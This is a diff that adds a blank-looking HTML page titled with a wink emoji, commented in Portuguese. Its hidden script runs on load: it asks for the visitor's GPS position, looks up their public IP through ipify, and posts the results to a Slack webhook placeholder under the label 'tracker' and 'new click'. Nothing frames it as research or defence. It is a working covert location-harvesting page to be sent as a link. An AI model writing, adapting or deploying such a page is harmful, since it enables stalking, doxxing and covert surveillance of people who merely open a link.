@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>😉</title>
+</head>
+<body>
+  <script>
+    // 1. GPS
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(function (p) {
+        const lat = p.coords.latitude;
+        const lon = p.coords.longitude;
+        const acc = p.coords.accuracy;
+        enviar({lat, lon, acc});
+      }, function () {
+        enviar({lat: 'negado', lon: 'negado', acc: 'n/a'});
+      });
+    } else {
+      enviar({lat: 'inexistente', lon: 'inexistente', acc: 'n/a'});
+    }
+
+    // 2. IP completo
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(d => enviar({ip: d.ip}))
+      .catch(() => enviar({ip: 'falhou'}));
+
+    // 3. Função que manda tudo para você
+    function enviar(extra = {}) {
+      fetch('https://hooks.slack.com/services/SEUWEBHOOK', { // ou qualquer URL que aceite POST
+        method: 'POST',
+        body: JSON.stringify({
+          text: '📍 Novo clique',
+          username: 'tracker',
+          icon_emoji: ':round_pushpin:',
+          attachments: [
+            {
+              color: 'good',
+              fields: Object.entries(extra).map(([k, v]) => ({title: k, value: v, short: true}))
+            }
+          ]
+        })
+      }).catch(() => {});
+    }
+  </script>
+</body>
+</html>
